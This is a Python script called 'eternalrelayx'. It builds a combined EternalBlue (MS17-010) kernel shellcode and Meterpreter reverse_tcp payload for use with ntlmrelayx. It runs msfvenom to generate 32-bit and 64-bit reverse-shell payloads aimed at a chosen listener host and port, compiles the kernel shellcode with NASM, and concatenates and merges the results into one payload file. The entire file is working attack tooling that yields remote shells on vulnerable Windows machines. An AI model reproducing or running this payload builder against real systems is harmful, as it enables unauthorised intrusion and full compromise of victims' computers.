#!/usr/bin/python
#
# Payload generation and eternalblue_sc_merge.py credit go to Worawit Wang (sleepya)
# https://github.com/worawit/MS17-010

import sys
import os
import subprocess

from argparse import ArgumentParser

def main():

    parser = ArgumentParser(description='eternalrelayx | Script for generating an EternalRelay Meterpreter payload (.bin)')

    parser.add_argument('--lhost32', help='LHOST for 32-bit payload')
    parser.add_argument('--lhost64', help='LHOST for 64-bit payload')
    parser.add_argument('--lport32', default='4445', help='LPORT for 32-bit payload')
    parser.add_argument('--lport64', default='4444', help='LPORT for 64-bit payload')
    parser.add_argument('--exitfunc', default='thread', help='Function for payload exit')
    parser.add_argument('--platform', default='Windows', help='Target platform (default=Windows)')
    parser.add_argument('--k32', default='{}/impacket/impacket/examples/ntlmrelayx/utils/shellcode/asm/eternalblue_kshellcode_x86.asm'.format(os.getcwd()), help='Path to 32-bit ETERNALBLUE kernel shellcode assembly (.asm) source code')
    parser.add_argument('--k64', default='{}/impacket/impacket/examples/ntlmrelayx/utils/shellcode/asm/eternalblue_kshellcode_x64.asm'.format(os.getcwd()), help='Path to 64-bit ETERNALBLUE kernel shellcode assembly (.asm) source code')
    parser.add_argument('--payload', default='{}/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_all.bin'.format(os.getcwd()), help='Path to save final Meterpreter payload')

    args = parser.parse_args()

    lhost32 = args.lhost32
    lhost64 = args.lhost64
    lport32 = args.lport32
    lport64 = args.lport64
    k32 = args.k32
    k64 = args.k64
    platform = args.platform
    payload = args.payload
    exitfunc = args.exitfunc

    if not args.lhost32 or not args.lhost64:
        parser.print_help()
        sys.exit()

    print "[*] Running MSFVenom to generate 32-bit and 64-bit payloads..."

    gen64 = subprocess.Popen('msfvenom --platform {} -a x64 -p windows/x64/meterpreter/reverse_tcp -f raw -o /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x64_msf.bin EXITFUNC={} LHOST={} LPORT={}'.format(platform, exitfunc, lhost64, lport64), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    gen32 = subprocess.Popen('msfvenom --platform {} -a x86 -p windows/meterpreter/reverse_tcp -f raw -o /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x86_msf.bin EXITFUNC={} LHOST={} LPORT={}'.format(platform, exitfunc, lhost32, lport32), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    gen64_buf = gen64.stderr.read().strip().split('\n')
    gen32_buf = gen32.stderr.read().strip().split('\n')

    for obj_64 in gen64_buf:
        if 'Payload size' in obj_64:
            print '[*] 64-bit Meterpreter payload size: {}'.format(obj_64.split(':')[1].strip())

        if 'Saved as' in obj_64:
            print '[*] Payload saved to {}'.format(obj_64.split(':')[1].strip())

    for obj_32 in gen32_buf:
        if 'Payload size' in obj_32:
            print '[*] 32-bit Meterpreter size is {} bytes'.format(obj_32.split(':')[1].strip())

        if 'Saved as' in obj_32:
            print '[*] Payload saved to {}'.format(obj_64.split(':')[1].strip())

    print "[*] Compiling Win32 kernel-mode shellcode with NASM..."
    os.system('nasm -f bin {} -o /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x64_kernel.bin'.format(k64))
    os.system('nasm -f bin {} -o /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x86_kernel.bin'.format(k32))

    print "[*] Concatenating user-mode and kernel-mode payloads..."
    os.system('cat /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x64_kernel.bin /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x64_msf.bin > /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x64.bin')
    os.system('cat /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x86_kernel.bin /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x86_msf.bin > /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x86.bin')

    print "[*] Merging 32-bit and 64-bit payloads into final payload..."
    os.system('python /opt/MS17-010/shellcode/eternalblue_sc_merge.py /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x86.bin /opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_x64.bin {}'.format(payload))
    print "[+] Completed!"

if __name__ == '__main__':

    main()
